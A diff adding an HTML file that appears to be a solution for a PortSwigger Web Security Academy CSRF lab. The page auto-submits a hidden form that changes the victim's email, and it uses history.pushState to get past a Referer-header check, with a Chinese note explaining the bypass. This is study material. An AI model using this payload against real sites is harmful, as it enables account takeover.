@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <form action="https://0a9300020487992d830673e1005f00d2.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="3@3" />
+    </form>
+    <script>
+history.pushState("", "", "/?0a9300020487992d830673e1005f00d2.web-security-academy.net/")
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+只要Referrer头中包含有效的域即可绕过
